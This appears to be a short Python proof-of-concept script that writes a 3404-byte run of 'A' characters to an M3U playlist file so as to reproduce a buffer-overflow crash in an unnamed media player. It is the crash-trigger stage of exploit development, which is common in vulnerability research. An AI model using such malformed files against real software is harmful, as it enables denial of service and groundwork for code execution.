# replicate crash
buffer = "A"*3404
f = open('file.m3u','w')
f.write(buffer)
f.close()
